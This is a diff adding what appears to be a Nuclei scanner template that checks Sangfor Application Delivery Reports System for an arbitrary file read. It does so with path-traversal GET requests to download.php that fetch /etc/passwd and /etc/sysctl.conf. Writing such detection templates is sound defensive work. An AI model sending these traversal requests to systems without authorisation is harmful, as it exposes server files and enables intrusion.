@@ -1,0 +1,38 @@
+id: poc-yaml-sangfor-app-delivery-reports-system-file-read
+info:
+  name: Sangfor App Delivery Reports System Arbitrary File Read Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-read
+  description: |
+    The Sangfor Application Delivery Reports System is vulnerable to an arbitrary file read vulnerability, allowing attackers to read sensitive files on the server.
+
+http:
+  - raw:
+      - |
+        GET /report/download.php?pdf=../../../../../etc/passwd HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status: 
+          - 200
+      - type: word
+        words:
+          - "/bin/bash"
+          - "/sbin/nologin"
+
+  - raw:
+      - |
+        GET /report/download.php?pdf=../../../../../etc/sysctl.conf HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status: 
+          - 200
+      - type: word
+        words:
+          - "# Kernel sysctl configuration file for Red Hat Linux"
